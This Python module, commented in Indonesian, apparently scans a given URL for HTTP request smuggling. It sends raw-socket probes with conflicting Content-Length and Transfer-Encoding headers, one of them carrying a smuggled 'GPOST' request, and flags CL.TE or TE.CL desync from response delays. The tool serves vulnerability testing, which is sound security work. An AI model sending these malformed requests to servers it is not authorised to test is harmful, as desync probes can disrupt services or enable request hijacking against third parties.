import socket
import ssl
import time
import urllib.parse
from colorama import Fore, Style

class SmugglingHunter:
    def __init__(self, target_url):
        self.target_url = target_url
        self.parsed = urllib.parse.urlparse(target_url)
        self.host = self.parsed.netloc
        self.path = self.parsed.path if self.parsed.path else "/"
        self.port = 443 if self.parsed.scheme == "https" else 80
        self.scheme = self.parsed.scheme
        self.timeout = 5 # Detik (Baseline)

    def create_socket(self):
        """Membuat koneksi Raw Socket (HTTP/HTTPS)"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10) # Max wait
            sock.connect((self.host, self.port))
            
            if self.scheme == "https":
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=self.host)
            
            return sock
        except Exception as e:
            return None

    def send_payload(self, name, payload_bytes):
        """Mengirim payload dan mengukur waktu respon"""
        sock = self.create_socket()
        if not sock:
            print(f"{Fore.RED}[!] Connection Failed to {self.host}{Style.RESET_ALL}")
            return

        print(f"   {Fore.WHITE}Testing Vector: {Fore.YELLOW}{name}{Style.RESET_ALL}", end="\r")
        
        start_time = time.time()
        try:
            sock.sendall(payload_bytes)
            # Kita baca 1 byte saja untuk trigger respon
            sock.recv(1) 
            duration = time.time() - start_time
        except socket.timeout:
            # Timeout adalah indikator kuat untuk TE.CL / CL.TE!
            duration = time.time() - start_time
            duration = 999 # Force high value
        except Exception:
            duration = 0
        finally:
            sock.close()

        return duration

    def run_scan(self):
        print(f"\n{Fore.CYAN}[*] MODULE START: HTTP Request Smuggling Hunter (HRS){Style.RESET_ALL}")
        print(f"{Fore.WHITE}[*] Target: {Fore.GREEN}{self.host} (Raw Socket Mode){Style.RESET_ALL}")
        
        # --- PAYLOAD CONSTRUCTION ---
        # Payload harus sangat presisi (\r\n)
        
        # 1. CL.TE (Frontend uses CL, Backend uses TE)
        # Frontend baca 6 bytes ("0\r\n\r\n"), kirim ke backend.
        # Backend (TE) baca chunk "0", nunggu chunk berikutnya -> HANG (Timeout)
        cl_te_payload = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"X" # 'X' tertinggal di socket
        ).encode()

        # 2. TE.CL (Frontend uses TE, Backend uses CL)
        # Frontend (TE) baca chunk 0 (selesai).
        # Backend (CL) baca panjang 4 ("5c\r\n"), tapi body cuma "0\r\n\r\n". 
        # Backend nunggu sisa data -> HANG (Timeout)
        te_cl_payload = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"5c\r\n" # Chunk size (hex)
            f"GPOST / HTTP/1.1\r\n" # Smuggled request start
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 15\r\n"
            f"\r\n"
            f"x=1\r\n"
            f"0\r\n"
            f"\r\n"
        ).encode()

        # --- EXECUTION ---
        print(f"{Fore.YELLOW}[+] Sending Desynchronization Probes...{Style.RESET_ALL}")
        
        # Baseline check (Normal Request)
        base_payload = (
            f"GET {self.path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Connection: close\r\n\r\n"
        ).encode()
        
        base_time = self.send_payload("Baseline Check", base_payload)
        if base_time == 999:
            print(f"{Fore.RED}[!] Server Unstable/Timeout on normal request. Aborting.{Style.RESET_ALL}")
            return
            
        print(f"   {Fore.WHITE}Baseline Latency: {base_time:.2f}s{Style.RESET_ALL}")

        # Test CL.TE
        cl_te_time = self.send_payload("CL.TE Detection", cl_te_payload)
        if cl_te_time > 5: # Jika delay > 5 detik
            print(f"\n   {Fore.RED}[CRITICAL] POSSIBLE CL.TE VULNERABILITY DETECTED!{Style.RESET_ALL}")
            print(f"   ├── Backend hung for: {cl_te_time}s")
            print(f"   └── Logic: Frontend used CL, Backend expected TE chunk.")
        else:
            print(f"   {Fore.GREEN}[SAFE] CL.TE vector Normal ({cl_te_time:.2f}s){Style.RESET_ALL}")

        # Test TE.CL
        te_cl_time = self.send_payload("TE.CL Detection", te_cl_payload)
        if te_cl_time > 5:
            print(f"\n   {Fore.RED}[CRITICAL] POSSIBLE TE.CL VULNERABILITY DETECTED!{Style.RESET_ALL}")
            print(f"   ├── Backend hung for: {te_cl_time}s")
            print(f"   └── Logic: Frontend used TE, Backend waited for CL body.")
        else:
            print(f"   {Fore.GREEN}[SAFE] TE.CL vector Normal ({te_cl_time:.2f}s){Style.RESET_ALL}")

        print("-" * 60)
        print(f"{Fore.WHITE}Note: Smuggling detection uses Time-Delay technique to avoid mass poisoning.{Style.RESET_ALL}")

def run_smuggling_scan(url):
    engine = SmugglingHunter(url)
    engine.run_scan()